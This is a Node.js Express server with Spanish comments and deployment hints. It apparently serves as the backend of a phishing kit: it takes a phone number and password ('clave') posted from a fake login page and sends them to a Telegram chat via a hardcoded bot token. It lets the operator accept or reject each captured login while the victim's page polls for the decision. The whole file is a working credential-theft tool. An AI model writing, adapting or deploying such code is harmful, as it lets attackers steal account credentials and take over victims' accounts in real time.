// ===== BACKEND (server.js) =====
// Subir a Render, Replit o cualquier hosting de Node.js
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_TOKEN = '7923953393:AAG-Ie0tqZ_QwKevEGQEtJS2Y0zRNJUC-dA';
const CHAT_ID = '-1002808918964';

// Temporalmente almacena la decisión por número
const estados = {}; // Ej: estados['3101234567'] = 'aceptado';

// Endpoint para recibir datos del frontend y enviar a Telegram
app.post('/enviar', async (req, res) => {
  const { numero, clave } = req.body;

  const mensaje = `Nuevo acceso:\n\n\ud83d\udcde Número: ${numero}\n\ud83d\udd11 Clave: ${clave}`;

  const payload = {
    chat_id: CHAT_ID,
    text: mensaje,
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ Aceptar', callback_data: `aceptar_${numero}` },
          { text: '❌ Rechazar', callback_data: `rechazar_${numero}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  res.send({ ok: true });
});

// Endpoint para manejar callback de Telegram
app.post('/webhook', (req, res) => {
  const callback = req.body.callback_query;
  const data = callback.data;
  const numero = data.split('_')[1];
  const accion = data.split('_')[0];

  estados[numero] = accion;

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has elegido: ${accion}`
    })
  });

  res.sendStatus(200);
});

// Endpoint para el frontend para saber si ya fue redirigido
app.get('/estado/:numero', (req, res) => {
  const numero = req.params.numero;
  res.send({ estado: estados[numero] || null });
});

app.listen(3000, () => console.log('Servidor corriendo en puerto 3000'));